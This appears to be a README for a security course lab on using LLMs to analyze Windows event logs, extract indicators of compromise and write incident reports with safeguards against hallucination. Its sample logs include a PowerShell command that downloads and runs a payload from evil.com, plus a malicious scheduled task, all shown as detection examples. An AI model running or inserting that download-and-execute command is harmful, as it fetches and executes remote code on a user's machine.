# Lab 04: LLM-Powered Security Log Analysis

Use Large Language Models to analyze, correlate, and explain security logs.

---

## 🎯 Learning Objectives

By completing this lab, you will:

1. Use LLMs to parse and normalize log data
2. Build prompts for security analysis
3. Extract IOCs and threat indicators from logs
4. Generate human-readable incident summaries
5. Map findings to MITRE ATT&CK framework

---

## ⏱️ Estimated Time

60-90 minutes (with AI assistance)

---

## 📋 Prerequisites

- Completed Labs 01-03
- Anthropic API key or Ollama installed
- Basic understanding of Windows Event Logs

### Required Libraries

```bash
pip install langchain langchain-anthropic python-dotenv rich
```

---

## 📖 Background

Security logs are goldmines of information but overwhelming in volume. LLMs can help:

- **Parse** complex log formats automatically
- **Correlate** events across different log sources
- **Explain** what happened in plain English
- **Prioritize** which events need attention
- **Recommend** response actions

### Common Log Sources

| Log Source | Windows Event ID | What It Shows               |
| ---------- | ---------------- | --------------------------- |
| Security   | 4624             | Successful logon            |
| Security   | 4625             | Failed logon                |
| Security   | 4688             | Process creation            |
| Security   | 4698             | Scheduled task created      |
| PowerShell | 4104             | Script block logging        |
| Sysmon     | 1                | Process creation (detailed) |
| Sysmon     | 3                | Network connection          |

---

## ⚠️ Critical: LLM Limitations in Log Analysis

Before building your analyzer, understand what can go wrong:

### Hallucination Risks

| Risk | Example | Impact |
|------|---------|--------|
| **Invented IOCs** | LLM adds IPs not in logs | Blocking legitimate infrastructure |
| **False MITRE mappings** | "T1999" (doesn't exist) | Incorrect threat modeling |
| **Confident misattribution** | "This is APT29" (no evidence) | Wrong response procedures |
| **Missing real threats** | "This looks benign" (it's not) | Undetected compromise |

### Mitigation Strategies for This Lab

1. **Ground in provided data**: Every finding must cite specific log lines
2. **Require evidence**: "Quote the exact log entry that shows this"
3. **Allow uncertainty**: "If unsure, say POSSIBLE not CONFIRMED"
4. **Validate IOCs**: Only extract IOCs explicitly present in logs
5. **Human review**: LLM output assists analysts, doesn't replace them

### Example: Good vs Bad Prompts

```
❌ BAD: "Analyze these logs for threats"
   → LLM may invent threats or miss real ones

✅ GOOD: "Analyze these logs for threats. 
   For each finding:
   1. Quote the exact log line as evidence
   2. Rate confidence 1-10
   3. If uncertain, say 'POSSIBLE' not 'CONFIRMED'
   4. Only report IOCs that appear in the logs
   5. If no threats found, say so - don't invent issues"
```

> 📖 **Deep dive**: See [Security Prompts Template](../../templates/prompts/security_prompts.md) for production-ready prompts with full hallucination mitigation.

---

## 🔬 Lab Tasks

### Task 1: Set Up LLM Client (10 min)

Configure your LLM client in `starter/main.py`:

```python
def setup_llm():
    """
    Initialize the LLM client.

    TODO:
    1. Load API key from environment
    2. Create ChatAnthropic or Ollama client
    3. Test with a simple message
    4. Return the client

    Options:
    - Anthropic: ChatAnthropic(model="claude-sonnet-4-20250514")
    - Ollama: ChatOllama(model="llama3.1:8b")
    """
    pass
```

### Task 2: Log Parser Agent (20 min)

Build an LLM-powered log parser:

```python
def parse_log_entry(llm, log_entry: str) -> dict:
    """
    Use LLM to parse a raw log entry into structured data.

    Args:
        llm: Language model client
        log_entry: Raw log text

    Returns:
        Structured dict with:
        - timestamp: When it happened (exact from log, or null)
        - event_type: What type of event
        - source: Where it came from
        - user: Who was involved (exact from log, or null)
        - details: Key details
        - severity: Estimated severity (1-10)
        - confidence: How confident in the parsing (1-10)

    TODO:
    1. Create a prompt that instructs the LLM to:
       - ONLY extract information present in the log
       - Return null for missing fields (NOT guesses)
       - Quote exact values from the log
       - Return structured JSON
    2. Parse the LLM response
    3. Validate extracted fields exist in original log
    4. Return the structured data
    
    ANTI-HALLUCINATION: If a field isn't in the log, return null.
    Do NOT invent usernames, IPs, or timestamps.
    """
    pass
```

**Sample Input:**

```
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2024-01-15T03:24:15.123Z"/>
    <Computer>WORKSTATION01</Computer>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c whoami</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="SubjectUserName">jsmith</Data>
  </EventData>
</Event>
```

**Expected Output:**

```json
{
  "timestamp": "2024-01-15T03:24:15.123Z",
  "event_type": "Process Creation",
  "event_id": 4688,
  "source": "WORKSTATION01",
  "user": "jsmith",
  "details": {
    "process": "cmd.exe",
    "command_line": "cmd.exe /c whoami",
    "parent_process": "powershell.exe"
  },
  "severity": 6
}
```

### Task 3: Threat Detection Analyzer (20 min)

Build an analyzer that identifies suspicious patterns:

```python
def analyze_logs_for_threats(llm, logs: List[dict]) -> dict:
    """
    Analyze a batch of logs for security threats.

    Args:
        llm: Language model client
        logs: List of parsed log entries

    Returns:
        Analysis dict with:
        - threats_detected: List with evidence and confidence
        - iocs: ONLY indicators present in logs
        - mitre_mapping: Techniques with supporting evidence
        - timeline: Sequence of events from logs
        - severity: Overall severity (with confidence)
        - recommendations: Suggested actions
        - uncertainties: What couldn't be determined

    TODO:
    1. Format logs for LLM context
    2. Create analysis prompt WITH THESE RULES:
       - Every threat must cite specific log evidence
       - Confidence score (1-10) for each finding
       - "POSSIBLE" vs "CONFIRMED" classification
       - Only extract IOCs present in logs
       - List what CANNOT be determined
    3. Ask LLM to identify patterns with evidence
    4. Map to MITRE only with clear evidence
    5. Generate recommendations
    6. Run verification prompt to catch hallucinations
    
    CRITICAL: Validate that all IOCs in output actually 
    appear in the input logs. Remove any that don't.
    """
    pass
```

### Task 4: IOC Extractor (15 min)

Extract indicators of compromise:

```python
def extract_iocs(llm, text: str) -> dict:
    """
    Extract IOCs from log data or incident text.
    
    ⚠️ CRITICAL: Only extract IOCs that ACTUALLY APPEAR in the text.
    LLMs may hallucinate plausible-looking IOCs. Always validate.

    Returns:
        {
            "ips": ["192.168.1.100", ...],
            "domains": ["evil.com", ...],
            "urls": ["http://...", ...],
            "hashes": {"md5": [], "sha256": []},
            "file_paths": ["C:\\Windows\\...", ...],
            "usernames": ["admin", ...],
            "emails": ["attacker@...", ...],
            "extraction_confidence": 8  # How confident in extraction
        }

    TODO:
    1. Create extraction prompt with rule:
       "Only extract IOCs explicitly present in the text.
        Do NOT infer, guess, or add IOCs not in the input."
    2. Parse LLM response into categories
    3. VALIDATE: Check each IOC exists in original text
    4. Remove any IOCs not found in original (hallucinations!)
    5. Remove duplicates
    6. Format-validate (is IP valid? is hash correct length?)
    
    VALIDATION CODE (add this):
    ```
    for ioc in extracted_iocs["ips"]:
        if ioc not in original_text:
            print(f"WARNING: Hallucinated IOC removed: {ioc}")
            extracted_iocs["ips"].remove(ioc)
    ```
    """
    pass
```

### Task 5: Incident Summary Generator (15 min)

Generate executive-friendly summaries:

```python
def generate_incident_summary(llm, analysis: dict) -> str:
    """
    Generate a human-readable incident summary.
    
    ⚠️ Summaries go to executives. Be accurate, not impressive.
    Mark uncertainties clearly. Don't speculate on attribution.

    Args:
        analysis: Output from analyze_logs_for_threats()

    Returns:
        Markdown-formatted summary including:
        - Executive summary (2-3 sentences, facts only)
        - What happened (timeline from logs)
        - Confidence level for each major finding
        - What we know vs. what we're investigating
        - IOCs for blocking (verified only)
        - Recommended actions
        - MITRE ATT&CK mapping (with evidence)

    TODO:
    1. Create summary prompt with rules:
       - "Only include facts from the analysis data"
       - "Mark uncertain items as 'Under Investigation'"
       - "Do not speculate on threat actor identity"
       - "Include confidence levels"
    2. Include all relevant context
    3. Format output in readable markdown
    4. Add "What We Don't Know" section
    
    IMPORTANT: Executives may act on this summary.
    Better to say "unknown" than guess wrong.
    """
    pass
```

### Task 6: Complete Pipeline (10 min)

Wire everything together:

```python
def analyze_security_incident(log_data: str) -> str:
    """
    Complete pipeline: Parse → Analyze → Summarize.

    Args:
        log_data: Raw log data (multiple entries)

    Returns:
        Complete incident report
    """
    pass
```

---

## 📁 Files

```
lab04-llm-log-analysis/
├── README.md
├── starter/
│   └── main.py
├── solution/
│   └── main.py
├── data/
│   ├── sample_logs.txt      # Sample Windows logs
│   ├── attack_scenario.txt  # Multi-stage attack logs
│   └── benign_logs.txt      # Normal activity logs
└── prompts/
    ├── parser_prompt.txt
    ├── analyzer_prompt.txt
    └── summary_prompt.txt
```

---

## 📝 Sample Log Data

```
# PowerShell execution (Event ID 4104)
2024-01-15 03:22:10 | WORKSTATION01 | PowerShell | 4104 | Script Block:
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Process Creation (Event ID 4688)
2024-01-15 03:22:15 | WORKSTATION01 | Security | 4688 |
User: CORP\jsmith | Process: cmd.exe | CommandLine: cmd.exe /c whoami
Parent: powershell.exe

# Network Connection (Sysmon Event ID 3)
2024-01-15 03:22:20 | WORKSTATION01 | Sysmon | 3 |
Process: powershell.exe | DestinationIP: 185.143.223.47 | DestinationPort: 443

# Scheduled Task (Event ID 4698)
2024-01-15 03:25:00 | WORKSTATION01 | Security | 4698 |
User: CORP\jsmith | TaskName: \Microsoft\Windows\Maintenance\update
Command: C:\Users\Public\malware.exe
```

---

## ✅ Success Criteria

- [ ] LLM client initializes correctly
- [ ] Log parser extracts all key fields (no hallucinated fields)
- [ ] Threat analyzer identifies attack patterns with evidence
- [ ] IOC extractor finds all indicators (verified against input)
- [ ] No hallucinated IOCs in output (validation check passes)
- [ ] Confidence scores included for findings
- [ ] Summary clearly marks uncertainties
- [ ] Summary is clear and actionable
- [ ] MITRE ATT&CK techniques have cited evidence

---

## 🎯 Expected Analysis Output

```markdown
# Security Incident Report

**Overall Confidence: 8/10** (High - clear attack chain with evidence)

## Executive Summary

A multi-stage attack was detected on WORKSTATION01 starting at 03:22 UTC.
The attacker used PowerShell to download and execute malicious code,
performed reconnaissance, and established persistence via scheduled task.

## What We Know (Confirmed)

| Finding | Evidence | Confidence |
|---------|----------|------------|
| PowerShell download | Log: "IEX...DownloadString('http://evil.com/payload.ps1')" | 10/10 |
| Reconnaissance | Log: "cmd.exe /c whoami" | 10/10 |
| C2 connection | Log: "DestinationIP: 185.143.223.47" | 9/10 |
| Persistence | Log: "TaskName: \Microsoft\Windows\Maintenance\update" | 9/10 |

## What We're Still Investigating

- Threat actor attribution (no definitive evidence)
- Lateral movement to other systems (no evidence in these logs)
- Data exfiltration (would need network logs)

## Timeline (From Logs)

1. 03:22:10 - PowerShell downloads payload from evil.com
2. 03:22:15 - Reconnaissance command (whoami) executed
3. 03:22:20 - C2 connection to 185.143.223.47:443
4. 03:25:00 - Persistence established via scheduled task

## MITRE ATT&CK Mapping

| Technique | Evidence from Logs |
|-----------|-------------------|
| T1059.001 - PowerShell | "IEX (New-Object Net.WebClient)..." |
| T1105 - Ingress Tool Transfer | "DownloadString('http://evil.com/...')" |
| T1033 - System Owner/User Discovery | "cmd.exe /c whoami" |
| T1053.005 - Scheduled Task | "TaskName: ...update, Command: malware.exe" |

## Indicators of Compromise (Verified in Logs)

- Domain: evil.com ✓
- IP: 185.143.223.47 ✓
- File: C:\Users\Public\malware.exe ✓

## Recommendations

1. **IMMEDIATE**: Isolate WORKSTATION01 from network
2. Block evil.com and 185.143.223.47 at firewall
3. Remove scheduled task and malware.exe
4. Reset credentials for jsmith
5. Scan other endpoints for same IOCs

---
*This report was generated with AI assistance and should be verified by a human analyst before major actions.*
```

---

## 💡 Prompt Engineering Tips

### Good Prompts Include:

1. **Role**: "You are a senior security analyst..."
2. **Context**: "Analyzing Windows Event Logs from a corporate network..."
3. **Task**: "Identify suspicious activities and extract IOCs..."
4. **Format**: "Return your analysis as JSON with these fields..."
5. **Examples**: Show expected input/output format

### Example System Prompt (With Hallucination Mitigation):

```
You are an expert security analyst specializing in Windows log analysis
and incident response. You have deep knowledge of:
- Windows Event IDs and their security implications
- MITRE ATT&CK framework
- Common attack patterns and TTPs
- IOC extraction and threat intelligence

CRITICAL RULES - FOLLOW EXACTLY:
1. Only identify threats you can PROVE from the log data provided
2. For EVERY finding, quote the EXACT log line as evidence
3. Do NOT invent IOCs - only extract IPs, domains, hashes explicitly in logs
4. Do NOT guess MITRE techniques - only map if clear evidence exists
5. Rate confidence 1-10 for each finding
6. If uncertain, say "POSSIBLE THREAT" not "CONFIRMED"
7. If no threats found, say "No confirmed threats" - don't invent issues

When analyzing logs:
1. Look for suspicious patterns across multiple events
2. Identify the attack chain if present  
3. Extract ONLY indicators that appear in the logs
4. Map to MITRE ATT&CK with cited evidence
5. Provide actionable recommendations
6. List what you CANNOT determine from the data

OUTPUT FORMAT for each finding:
- Finding: [description]
- Evidence: "[exact log line]"
- Confidence: [1-10]
- MITRE: [technique or "needs verification"]
- Action: [recommendation]
```

### Verification Prompt (Use After Analysis):

```
Review your analysis. For each claim:
1. Quote the exact log line that supports it
2. If you cannot find evidence, mark as [UNVERIFIED]
3. Remove or clearly label any speculation

Did you invent any IOCs not in the logs? If so, remove them.
Did you guess any MITRE techniques? If so, mark as "possible".
```

---

## 🚀 Bonus Challenges

1. **Streaming Analysis**: Process logs in real-time as they arrive
2. **Multi-Source Correlation**: Combine Windows, Sysmon, and network logs
3. **Hallucination Detection**: Build automated IOC validation that catches when LLM invents indicators
4. **Confidence Calibration**: Track LLM confidence vs actual accuracy over time
5. **False Positive Detection**: Identify likely false positives
6. **Self-Verification**: Implement the verification prompt as automated second pass
7. **Automated Response**: Generate containment scripts (with human approval gate)

---

## 📚 Resources

### External Resources
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Windows Security Event IDs](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)
- [Sysmon Configuration](https://github.com/SwiftOnSecurity/sysmon-config)
- [LangChain Documentation](https://python.langchain.com/docs/)

### Related Guides
- [Structured Output Parsing](../../docs/guides/structured-output-parsing.md) - Parse LLM JSON reliably
- [Prompt Injection Defense](../../docs/guides/prompt-injection-defense.md) - Protect against adversarial inputs in logs
- [LLM Evaluation & Testing](../../docs/guides/llm-evaluation-testing.md) - Test your log analyzer's accuracy

---

> **Stuck?** See the [Lab 04 Walkthrough](../../docs/walkthroughs/lab04-llm-log-analysis-walkthrough.md) for step-by-step guidance.

**Next Lab**: [Lab 05 - Threat Intelligence Agent](../lab05-threat-intel-agent/)
